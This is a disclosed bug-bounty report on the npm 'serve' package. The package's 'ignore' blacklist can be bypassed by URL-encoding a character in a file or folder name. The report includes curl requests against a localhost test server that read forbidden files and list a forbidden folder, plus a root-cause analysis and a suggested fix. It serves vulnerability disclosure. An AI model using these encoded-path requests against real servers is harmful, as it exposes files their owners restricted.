# [serve] Directory listing and File access even when they have been set to be ignored.

## Report Details
- **Report ID**: 308721
- **URL**: https://hackerone.com/reports/308721
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-01-24T19:02:23.144Z
- **Disclosed**: 2018-03-13T06:53:14.242Z

## Reporter
- **Username**: 0xchr00t
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
**Module:** 
- **Name**: `serve`
- **Version**: latest (`6.4.9`)
- **Link**: https://www.npmjs.com/package/serve

**Description:**
The `serve` modules allows directory browsing and to serve static files through the browser.
The config option `ignore` can be used to tell the module which file or directory are forbidden and should not be served. 
This rule can be bypassed by url encoding the name of the file or directory that has been forbidden. 

## Reproduction Steps:
- Install `serve`
- Create an application that uses serve for file serving listing and set a few folders and files in the `ignore` config.

```javascript
const serve = require('serve')
const server = serve(__dirname, {
	  port: 1337,
	  ignore: ['testfolder', 'test.txt']
})
```
- Run the app

```bash
$ node filename.js
```
- Now, current directory will be served by `serve` with the exception of folder `testfolder` and file `test.txt`
- If we try to curl `test.txt` we get a `Not Found` error

```bash
$ curl http://localhost:1337/test.txt
Not Found
```
- The url encoded value for `e` is `%65`. So after replacing an `e` with its url encoded form, we are able to access the file.

```bash
$ curl http://localhost:1337/t%65st.txt
this is a forbidden file :D
```
- Additionally, curling the directory `testfolder` returns a 404 too.

```bash
$ curl http://localhost:1337/testfolder/
Not Found
```
- Applying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.

```html
$ curl http://localhost:1337/t%65stfolder/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Files within testserve/testfolder/</title>
      .
      .
          <li>
            <a href="/testfolder/testfile.txt" title="testfile.txt" class="txt">testfile.txt</a>
            <i>31 B</i>
          </li>
      .
      .
```
- And then we can further access the files inside the forbidden folder using same strategy.

```bash
$ curl http://localhost:1337/t%65stfolder/testfile.txt
this is a test ... forbidden !
```


## Mitigation Strategy
From what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder. 
Note these particular lines in file `/lib/server.js`-

```javascript
90  const ignored = !ignoredFiles.every(item => {
91    return !pathname.includes(item)
92  })
```
Line `91` handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable `pathname` is used. This variable is not url decoded, while the variable which is used to actually serve the file is named `related` and is url decoded by passing requested path through `decodeURIComponent` function.
So one strategy would be to use the `related` variable for checking against the blacklist too.

## Impact

The issue essentially bypasses the `ignore files/folders` feature and allows an attacker to read from a directory/file that the victim has not allowed access to.

## Attachments
No attachments
